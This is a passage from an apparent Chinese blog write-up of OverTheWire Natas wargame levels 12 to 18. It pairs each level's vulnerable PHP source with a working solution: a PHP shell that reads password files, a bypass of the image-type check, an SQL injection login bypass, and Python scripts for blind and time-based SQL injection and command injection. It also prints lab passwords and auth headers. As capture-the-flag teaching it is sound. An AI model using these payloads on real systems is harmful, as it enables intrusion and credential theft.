class="line">?&gt; </span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">action</span>=<span class="string">&quot;index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;MAX_FILE_SIZE&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1000&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;filename&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;? print genRandomString(); ?&gt;.jpg&quot;</span> /&gt;</span></span><br><span class="line">Choose a JPEG to upload (max 1KB):<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;uploadedfile&quot;</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Upload File&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">&lt;? &#125; ?&gt; </span><br></pre></td></tr></table></figure>

<p>文件上传，利用<code> $ext = pathinfo($fn, PATHINFO_EXTENSION);</code>，抓包修改文件后缀为.php</p>
<p>php脚本为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /etc/natas_webpass/natas13&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>访问返回的网址即可得到密码</p>
<h2 id="Level-13"><a href="#Level-13" class="headerlink" title="Level 13"></a>Level 13</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY </span><br></pre></td></tr></table></figure>

<p>查看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;filename&quot;</span>, <span class="variable">$_POST</span>)) &#123;</span><br><span class="line">    <span class="variable">$target_path</span> = <span class="title function_ invoke__">makeRandomPathFromFilename</span>(<span class="string">&quot;upload&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&quot;filename&quot;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$err</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;uploadedfile&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$err</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$err</span> === <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;The uploaded file exceeds MAX_FILE_SIZE&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Something went wrong :/&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">filesize</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploadedfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]) &gt; <span class="number">1000</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File is too big&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (! <span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploadedfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File is not an image&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploadedfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$target_path</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;The file &lt;a href=\&quot;<span class="subst">$target_path</span>\&quot;&gt;<span class="subst">$target_path</span>&lt;/a&gt; has been uploaded&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;There was an error uploading the file, please try again!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>新增一个exif判断文件是否为图片：<code>exif_imagetype($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;])</code></p>
<p>在php文件头部添加 <code>GIF;</code> 即可绕过</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200209102904374.png" alt="image-20200209102904374"></p>
<h2 id="Level-14"><a href="#Level-14" class="headerlink" title="Level 14"></a>Level 14</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200209103237780.png" alt="image-20200209103237780"></p>
<p>查看源码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>natas14<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line">&lt;?</span><br><span class="line">if(array_key_exists(&quot;username&quot;, $_REQUEST)) &#123;</span><br><span class="line">    $link = mysql_connect(&#x27;localhost&#x27;, &#x27;natas14&#x27;, &#x27;<span class="tag">&lt;<span class="name">censored</span>&gt;</span>&#x27;);</span><br><span class="line">    mysql_select_db(&#x27;natas14&#x27;, $link);</span><br><span class="line">    </span><br><span class="line">    $query = &quot;SELECT * from users where username=\&quot;&quot;.$_REQUEST[&quot;username&quot;].&quot;\&quot; and password=\&quot;&quot;.$_REQUEST[&quot;password&quot;].&quot;\&quot;&quot;;</span><br><span class="line">    if(array_key_exists(&quot;debug&quot;, $_GET)) &#123;</span><br><span class="line">        echo &quot;Executing query: $query<span class="tag">&lt;<span class="name">br</span>&gt;</span>&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(mysql_num_rows(mysql_query($query, $link)) &gt; 0) &#123;</span><br><span class="line">            echo &quot;Successful login! The password for natas15 is <span class="tag">&lt;<span class="name">censored</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span>&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">            echo &quot;Access denied!<span class="tag">&lt;<span class="name">br</span>&gt;</span>&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    mysql_close($link);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">Username: <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">Password: <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Login&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">&lt;? &#125; ?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;viewsource&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;index-source.html&quot;</span>&gt;</span>View sourcecode<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br></pre></td></tr></table></figure>

<p>万能密码绕过：<code>admin&quot; or &quot;1&quot;=&quot;1</code></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200209103625234.png" alt="image-20200209103625234"></p>
<h2 id="Level-15"><a href="#Level-15" class="headerlink" title="Level 15"></a>Level 15</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200209103730879.png" alt="image-20200209103730879"></p>
<p>查看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">CREATE TABLE `users` (</span></span><br><span class="line"><span class="comment">  `username` varchar(64) DEFAULT NULL,</span></span><br><span class="line"><span class="comment">  `password` varchar(64) DEFAULT NULL</span></span><br><span class="line"><span class="comment">);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;username&quot;</span>, <span class="variable">$_REQUEST</span>)) &#123;</span><br><span class="line">    <span class="variable">$link</span> = <span class="title function_ invoke__">mysql_connect</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;natas15&#x27;</span>, <span class="string">&#x27;&lt;censored&gt;&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">mysql_select_db</span>(<span class="string">&#x27;natas15&#x27;</span>, <span class="variable">$link</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;SELECT * from users where username=\&quot;&quot;</span>.<span class="variable">$_REQUEST</span>[<span class="string">&quot;username&quot;</span>].<span class="string">&quot;\&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;debug&quot;</span>, <span class="variable">$_GET</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Executing query: <span class="subst">$query</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>, <span class="variable">$link</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$res</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">mysql_num_rows</span>(<span class="variable">$res</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;This user exists.&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;This user doesn&#x27;t exist.&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Error in query.&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mysql_close</span>(<span class="variable">$link</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>根据源码，推测是盲注。</p>
<p>写脚本爆破(这是一个简陋的脚本)：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://natas15.natas.labs.overthewire.org/index.php?debug=1&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&quot;Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==&quot;</span>, &#125;</span><br><span class="line">basic = <span class="string">&#x27;natas16&quot;and&quot;substr(password,1,1)&quot;&gt;&quot;&#x27;</span></span><br><span class="line">words = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;9&#x27;</span>) + <span class="number">1</span>):</span><br><span class="line">    words.append(<span class="built_in">chr</span>(i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>) + <span class="number">1</span>):</span><br><span class="line">    words.append(<span class="built_in">chr</span>(i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>) + <span class="number">1</span>):</span><br><span class="line">    words.append(<span class="built_in">chr</span>(i))</span><br><span class="line">    </span><br><span class="line">password = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> words:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;natas16&quot; and substr((SELECT password FROM users WHERE `username`= &quot;natas16&quot;),&#x27;</span>+<span class="built_in">str</span>(t+<span class="number">1</span>)+<span class="string">&#x27;,1)= BINARY &quot;&#x27;</span> + i + <span class="string">&#x27;&quot; #&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        result = requests.post(url, data=data, headers=headers)</span><br><span class="line">        ans = re.findall(<span class="string">&#x27;(.*)&lt;br&gt;&#x27;</span>, result.text)</span><br><span class="line">        tip = re.findall(<span class="string">&#x27;&lt;br&gt;(.*)&lt;br&gt;&#x27;</span>, result.text)[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(ans[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">if</span> (tip == <span class="string">&quot;This user exists.&quot;</span>):</span><br><span class="line">            password += i</span><br><span class="line">            <span class="built_in">print</span>(password)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Level-16"><a href="#Level-16" class="headerlink" title="Level 16"></a>Level 16</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">WaIHEacj63wnNIBROHeqi3p9t0m5nhmh</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参考链接：<a href="https://www.freebuf.com/column/182518.html">https://www.freebuf.com/column/182518.html</a></p>
</blockquote>
<p>查看源码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>natas16<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">For security reasons, we now filter even more on certain characters<span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">Find words containing: <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">needle</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">name</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">Search</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span></span><br><span class="line">&lt;?</span><br><span class="line">$key = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&quot;needle&quot;, $_REQUEST)) &#123;</span><br><span class="line">    $key = $_REQUEST[&quot;needle&quot;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($key != &quot;&quot;) &#123;</span><br><span class="line">    if(preg_match(&#x27;/[;|&amp;`\&#x27;&quot;]/&#x27;,$key)) &#123;</span><br><span class="line">        print &quot;Input contains an illegal character!&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        passthru(&quot;grep -i \&quot;$key\&quot; dictionary.txt&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;viewsource&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;index-source.html&quot;</span>&gt;</span>View sourcecode<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>同样是命令执行，不过这一次过滤的更多，而且将传入的 $key 置于一对双引号之间</p>
<p>但是没有过滤 <code>$ ( )</code> </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Time: 2020/2/10 10:09</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://natas16.natas.labs.overthewire.org/index.php?needle=&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&quot;Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==&quot;</span>, &#125;</span><br><span class="line">words = []</span><br><span class="line">password = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;9&#x27;</span>) + <span class="number">1</span>):</span><br><span class="line">    words.append(<span class="built_in">chr</span>(i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>) + <span class="number">1</span>):</span><br><span class="line">    words.append(<span class="built_in">chr</span>(i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>) + <span class="number">1</span>):</span><br><span class="line">    words.append(<span class="built_in">chr</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> words:</span><br><span class="line">        <span class="comment"># 爆破出密码：利用$()内部执行grep ^加爆破的数据，后面拼接dictionary.txt中存在的单词，进行逐位爆破</span></span><br><span class="line">        <span class="comment"># 当爆破位正确时应当返回空，错误时返回拼接的那个单词</span></span><br><span class="line">        query = <span class="string">&quot;$(grep ^&quot;</span> + password + i + <span class="string">&quot; /etc/natas_webpass/natas17)African&quot;</span></span><br><span class="line">        re = requests.get(url=url + query, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(re.text) != <span class="number">1122</span>:</span><br><span class="line">            password += i</span><br><span class="line">            <span class="built_in">print</span>(password)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;.&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200210110001888.png" alt="image-20200210110001888"></p>
<h2 id="Level-17"><a href="#Level-17" class="headerlink" title="Level 17"></a>Level 17</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw</span><br></pre></td></tr></table></figure>

<p>查看源码:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>natas17<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line">&lt;?</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">CREATE TABLE `users` (</span><br><span class="line">  `username` varchar(64) DEFAULT NULL,</span><br><span class="line">  `password` varchar(64) DEFAULT NULL</span><br><span class="line">);</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&quot;username&quot;, $_REQUEST)) &#123;</span><br><span class="line">    $link = mysql_connect(&#x27;localhost&#x27;, &#x27;natas17&#x27;, &#x27;<span class="tag">&lt;<span class="name">censored</span>&gt;</span>&#x27;);</span><br><span class="line">    mysql_select_db(&#x27;natas17&#x27;, $link);</span><br><span class="line">    </span><br><span class="line">    $query = &quot;SELECT * from users where username=\&quot;&quot;.$_REQUEST[&quot;username&quot;].&quot;\&quot;&quot;;</span><br><span class="line">    if(array_key_exists(&quot;debug&quot;, $_GET)) &#123;</span><br><span class="line">        echo &quot;Executing query: $query<span class="tag">&lt;<span class="name">br</span>&gt;</span>&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $res = mysql_query($query, $link);</span><br><span class="line">    if($res) &#123;</span><br><span class="line">    if(mysql_num_rows($res) &gt; 0) &#123;</span><br><span class="line">        //echo &quot;This user exists.<span class="tag">&lt;<span class="name">br</span>&gt;</span>&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        //echo &quot;This user doesn&#x27;t exist.<span class="tag">&lt;<span class="name">br</span>&gt;</span>&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        //echo &quot;Error in query.<span class="tag">&lt;<span class="name">br</span>&gt;</span>&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close($link);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">Username: <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Check existence&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">&lt;? &#125; ?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;viewsource&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;index-source.html&quot;</span>&gt;</span>View sourcecode<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br></pre></td></tr></table></figure>

<p>基于时间的盲注</p>
<p>Python脚本:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Time: 2020/2/10 11:06</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://natas17.natas.labs.overthewire.org/index.php?debug=1&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&quot;Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw==&quot;</span>, &#125;</span><br><span class="line">words = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;9&#x27;</span>) + <span class="number">1</span>):</span><br><span class="line">    words.append(<span class="built_in">chr</span>(i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>) + <span class="number">1</span>):</span><br><span class="line">    words.append(<span class="built_in">chr</span>(i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>) + <span class="number">1</span>):</span><br><span class="line">    words.append(<span class="built_in">chr</span>(i))</span><br><span class="line"></span><br><span class="line">password = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        flag = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> words:</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;natas18&quot; and if(substr((SELECT password FROM users WHERE `username`= &quot;natas18&quot;),&#x27;</span> + <span class="built_in">str</span>(</span><br><span class="line">                    t + <span class="number">1</span>) + <span class="string">&#x27;,1)= BINARY &quot;&#x27;</span> + i + <span class="string">&#x27;&quot;,0,sleep(3)) #&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            stime = time.time()</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    res = requests.post(url, data=data, headers=headers)</span><br><span class="line">                <span class="keyword">except</span> requests.exceptions.ConnectTimeout:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            etime = time.time()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (etime - stime &lt; <span class="number">3</span>):</span><br><span class="line">                password += i</span><br><span class="line">                flag = <span class="literal">True</span></span><br><span class="line">                <span class="built_in">print</span>(password)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;进度:&quot;</span>, (t + <span class="number">1</span>), <span class="string">&quot;/32&quot;</span>, <span class="string">&quot;本次请求用时:&quot;</span>, etime - stime, <span class="string">&#x27;字符:&#x27;</span>, i)</span><br><span class="line">        <span class="keyword">if</span> flag == <span class="literal">False</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Level-18"><a href="#Level-18" class="headerlink" title="Level 18"></a>Level 18</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP</span><br></pre></td></tr></table></figure>

